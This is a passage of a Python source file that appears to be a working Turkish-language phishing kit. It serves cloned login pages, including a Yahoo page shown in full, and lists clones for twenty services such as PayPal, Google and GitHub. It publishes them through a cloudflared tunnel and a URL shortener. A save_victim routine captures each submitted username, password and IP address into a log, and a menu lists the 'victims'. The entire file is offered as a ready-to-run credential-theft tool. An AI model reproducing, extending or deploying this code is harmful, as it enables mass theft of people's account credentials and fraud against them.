<label class="checkbox"><input type="checkbox" checked> Beni hatırla</label>
<button class="btn" type="submit">Giriş Yap</button>
</form>
<a class="lost" href="#">Şifreni mi kaybettin?</a>
<div class="back">← <a href="#">𝐒𝐓𝐑𝐎𝐌</a>'a dön</div>
</div>
</body></html>"""

YAHOO_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Yahoo - Oturum açın</title>
<style>""" + BASE_STYLE + """
body{background:linear-gradient(135deg,#5f01d1 0%,#7f1fff 100%);flex-direction:column;padding:20px}
.card{background:#fff;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.3);padding:44px 36px;width:100%;max-width:400px}
.logo{text-align:center;margin-bottom:8px}
.brand{font-size:28px;font-weight:700;color:#5f01d1;letter-spacing:-1px}
.title{font-size:22px;font-weight:600;text-align:center;margin-bottom:6px;color:#1a1a1a}
.subtitle{font-size:14px;color:#666;text-align:center;margin-bottom:28px}
.field{width:100%;padding:14px;margin-bottom:12px;border:1px solid #ccc;border-radius:8px;font-size:15px;outline:none}
.field:focus{border-color:#5f01d1}
.btn{width:100%;padding:14px;background:#5f01d1;color:#fff;border:none;border-radius:24px;font-size:15px;font-weight:700;margin-top:8px}
.forgot{display:block;text-align:center;font-size:13px;color:#5f01d1;margin-top:16px;font-weight:600}
.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#999;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e0e0e0}
.social{width:100%;padding:12px;background:#fff;color:#1a1a1a;border:1px solid #ccc;border-radius:24px;font-size:14px;font-weight:600;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px}
.signup{text-align:center;font-size:13px;color:#666;margin-top:20px}
.signup a{color:#5f01d1;font-weight:700}
.footer{text-align:center;font-size:11px;color:#999;margin-top:20px;line-height:1.5}
.footer a{color:#5f01d1}
</style></head>
<body>
<div class="card">
<div class="logo"><span class="brand">yahoo!</span></div>
<div class="title">Oturum açın</div>
<div class="subtitle">Yahoo hesabınızla devam edin</div>
<form method="POST" action="/login/yahoo">
<input class="field" type="text" name="username" placeholder="E-posta, telefon veya kullanıcı adı" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<a class="forgot" href="#">Şifrenizi mi unuttunuz?</a>
<button class="btn" type="submit">Oturum aç</button>
</form>
<div class="divider">VEYA</div>
<button class="social">🔵 Google ile devam et</button>
<button class="social">📘 Facebook ile devam et</button>
<div class="signup">Hesabınız yok mu? <a href="#">Kaydolun</a></div>
<div class="footer">© 2024 Yahoo. Tüm hakları saklıdır. · <a href="#">Gizlilik</a> · <a href="#">Şartlar</a></div>
</div>
</body></html>"""

HTML_TEMPLATES = {
    'facebook': FB_HTML, 'instagram': IG_HTML, 'google': GOOGLE_HTML,
    'twitter': TWITTER_HTML, 'netflix': NETFLIX_HTML, 'spotify': SPOTIFY_HTML,
    'discord': DISCORD_HTML, 'steam': STEAM_HTML, 'tiktok': TIKTOK_HTML,
    'twitch': TWITCH_HTML, 'paypal': PAYPAL_HTML, 'github': GITHUB_HTML,
    'microsoft': MS_HTML, 'roblox': ROBLOX_HTML, 'linkedin': LINKEDIN_HTML,
    'snapchat': SNAPCHAT_HTML, 'pinterest': PINTEREST_HTML, 'reddit': REDDIT_HTML,
    'wordpress': WP_HTML, 'yahoo': YAHOO_HTML
}

def get_template(site):
    if site in HTML_TEMPLATES:
        return HTML_TEMPLATES[site]
    return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Giriş</title>
<style>body{{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}.container{{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:100%;max-width:400px}}input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px;box-sizing:border-box}}button{{width:100%;padding:14px;background:#1877F2;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer}}</style>
</head><body><div class="container"><h2 style="text-align:center">{site.capitalize()} Giriş</h2>
<form method="POST" action="/login/{site}"><input type="text" name="username" placeholder="Kullanıcı adı" required><input type="password" name="password" placeholder="Şifre" required><button type="submit">Giriş Yap</button></form></div></body></html>'''

SITES = {
    '1': 'facebook', '2': 'instagram', '3': 'google', '4': 'twitter',
    '5': 'netflix', '6': 'spotify', '7': 'discord', '8': 'steam',
    '9': 'tiktok', '10': 'twitch', '11': 'paypal', '12': 'github',
    '13': 'microsoft', '14': 'roblox', '15': 'linkedin', '16': 'snapchat',
    '17': 'pinterest', '18': 'reddit', '19': 'wordpress', '20': 'yahoo'
}

def check_cloudflared():
    try:
        result = subprocess.run(['cloudflared', '--version'], capture_output=True, timeout=5)
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False

def install_cloudflared():
    print(f"{YELLOW}[*] {T('installing')}{RESET}")
    try:
        os.system('pkg install cloudflared -y 2>/dev/null || apt install cloudflared -y 2>/dev/null || apt-get install cloudflared -y 2>/dev/null')
        time.sleep(2)
        return check_cloudflared()
    except Exception:
        return False

def find_free_port():
    global PORT
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('', 0))
        PORT = sock.getsockname()[1]
        sock.close()
        return PORT
    except Exception:
        PORT = 8080
        return PORT

def start_tunnel():
    global TUNNEL_URL, TUNNEL_PROCESS, PORT

    if not check_cloudflared():
        if not install_cloudflared():
            print(f"{RED}❌ {T('install_fail')}{RESET}")
            return None

    for attempt in range(1, 4):
        try:
            print(f"{YELLOW}[+] {T('tunnel_start')} ({T('tunnel_attempt')} {attempt}/3){RESET}")
            TUNNEL_PROCESS = subprocess.Popen(
                ['cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                text=True
            )
            start_time = time.time()
            while time.time() - start_time < 25:
                if TUNNEL_PROCESS.poll() is not None:
                    break
                line = TUNNEL_PROCESS.stderr.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if match:
                    TUNNEL_URL = match.group(0)
                    return TUNNEL_URL
            print(f"{RED}[!] {T('url_fail')}{RESET}")
            try:
                TUNNEL_PROCESS.terminate()
                TUNNEL_PROCESS.wait(timeout=3)
            except Exception:
                pass
            TUNNEL_PROCESS = None
            time.sleep(2)
        except Exception as e:
            print(f"{RED}❌ {T('tunnel_err')} {e}{RESET}")
            TUNNEL_PROCESS = None
    return None

def shorten_url(long_url):
    try:
        response = requests.post(
            "https://urlsmush.com/api.php",
            json={"url": long_url},
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return data.get('data', {}).get('short_url')
    except Exception:
        pass
    return None

def save_victim(site, username, password, ip):
    try:
        os.makedirs('auth', exist_ok=True)
        with open(LOGS_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] {site} | {username}:{password} | IP: {ip}\n")
        print(f"""
{RED}{BOLD}{T('new_victim')}{RESET}
{GREEN}{T('site_l')} {site}{RESET}
{GREEN}{T('user_l')} {username}{RESET}
{GREEN}{T('pass_l')} {password}{RESET}
{GREEN}{T('ip_l')} {ip}{RESET}
{GREEN}{T('date_l')} {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}{RESET}
{WHITE}{'─'*50}{RESET}
""")
        return True
    except Exception as e:
        print(f"{RED}[!] {T('save_err')} {e}{RESET}")
        return False

@app.route('/')
def home():
    return redirect(f'/{current_site}')

@app.route('/<site>')
def phishing_page(site):
    return render_template_string(get_template(site))

@app.route('/login/<site>', methods=['POST'])
def catch_login(site):
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr or '').split(',')[0].strip()
    if username and password:
        save_victim(site, username, password, ip)
    return redirect('/')

def run_flask():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    try:
        app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)
    except Exception as e:
        print(f"{RED}[!] {T('flask_err')} {e}{RESET}")

def show_victims():
    try:
        if os.path.exists(LOGS_FILE):
            with open(LOGS_FILE, 'r', encoding='utf-8') as f:
                logs = f.readlines()
            if not logs:
                print(f"\n{YELLOW}[!] {T('no_victim')}{RESET}")
                return
            print(f"\n{GREEN}{BOLD}{T('victim_list')} ({len(logs)}){RESET}")
            print(f"{WHITE}══════════════════════════════════════════════════════{RESET}")
            for i, log in enumerate(reversed(logs), 1):
                print(f"{GREEN}[{i}]{RESET} {log.strip()}")
            print(f"{WHITE}══════════════════════════════════════════════════════{RESET}")
        else:
            print(f"\n{YELLOW}[!] {T('no_victim')}{RESET}")
    except Exception as e:
        print(f"{RED}{T('error')} {e}{RESET}")

def clear_logs():
    try:
        if os.path.exists(LOGS_FILE):
            os.remove(LOGS_FILE)
            print(f"{GREEN}{T('cleared')}{RESET}")
        else:
            print(f"{YELLOW}[!] {T('empty')}{RESET}")
    except Exception as e:
        print(f"{RED}{T('error')} {e}{RESET}")

def main():
    global PORT, TUNNEL_URL, current_site, TUNNEL_PROCESS, flask_thread_started

    while True:
        clear()
        print(f"""
{ACCENT}{BOLD}══════════════════════════════════════════════════════{RESET}
{WHITE}{BOLD}   🎯 {T('menu_title')}{RESET}
{WHITE}   ⚡ {T('menu_subtitle') if 'menu_subtitle' in TEXTS[LANG] else ''}{RESET}
{WHITE}   📡 {T('menu_sites') if 'menu_sites' in TEXTS[LANG] else ''}{RESET}
{WHITE}   {T('telegram')}{RESET}
{WHITE}   {T('kanal')}{RESET}
{ACCENT}{BOLD}══════════════════════════════════════════════════════{RESET}
""")
        items = list(SITES.items())
        for i in range(0, len(items), 4):
            line = ""
            for j in range(i, min(i + 4, len(items))):
                key, site = items[j]
                line += f"{GREEN}[{key.zfill(2)}]{RESET} {site.capitalize():<12}  "
            print(f"   {line}")
        print(f"""
{RED}[00]{RESET} 🚪 {T('exit')}
{RED}[99]{RESET} {T('victims')}
{WHITE}══════════════════════════════════════════════════════{RESET}
""")
        try:
            secim = input(f"\n{CYAN}[?] {T('choice')}: {RESET}").strip()
        except (EOFError, KeyboardInterrupt):
            cleanup()
            sys.exit(0)

        if secim in ('00', '0'):
            clear()
            print(f"{GREEN}[+] {T('exit_msg')}{RESET}\n")
            cleanup()
            sys.exit(0)
        elif secim == '99':
            show_victims()
            try:
                sec = input(f"\n{YELLOW}[?] {T('clear_prompt')}: {RESET}").strip().lower()
            except (EOFError, KeyboardInterrupt):
                continue
            if sec == '0':
                clear_logs()
            continue
        elif secim in SITES:
            site = SITES[secim]
            current_site = site
            print(f"\n{GREEN}[+] {site.capitalize()} {T('selected')}{RESET}")
            if not flask_thread_started:
                PORT = find_free_port()
                print(f"{YELLOW}[+] {T('server_start')} (Port: {PORT}){RESET}")
                flask_thread = threading.Thread(target=run_flask, daemon=True)
                flask_thread.start()
                flask_thread_started = True
                time.sleep(2)
            else:
                print(f"{YELLOW}[+] {T('server_running')} (Port: {PORT}){RESET}")
                time.sleep(0.5)
            if TUNNEL_PROCESS is None:
                TUNNEL_URL = start_tunnel()
            if TUNNEL_URL:
                full_url = f"{TUNNEL_URL}/{site}"
                print(f"\n{GREEN}{BOLD}{T('active')}{RESET}")
                print(f"{CYAN}{BOLD}{T('link')} {full_url}{RESET}")
                short = shorten_url(full_url)
                if short:
                    print(f"{YELLOW}{BOLD}{T('short')} {short}{RESET}")
                print(f"\n{YELLOW}[+] {T('send')}{RESET}")
                print(f"{YELLOW}[m] {T('back_hint')}{RESET}")
                print(f"{RED}{T('stop_hint')}{RESET}\n")
            else:
                print(f"{RED}{T('tunnel_fail')}{RESET}")
                print(f"{YELLOW}[!] http://localhost:{PORT} {T('manual')}{RESET}\n")
            try:
                while True:
                    cmd = input().strip().lower()
                    if cmd == 'm':
                        print(f"\n{YELLOW}[!] {T('back')}{RESET}")
                        time.sleep(0.5)
                        break
            except (EOFError, KeyboardInterrupt):
                print(f"\n{YELLOW}[!] {T('stopping')}{RESET}")
                cleanup()
                break
        else:
            print(f"{RED}{T('invalid')}{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    select_language()
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print(f"{GREEN}[+] {T('exit_msg')}{RESET}\n")
        cleanup()
        sys.exit(0)
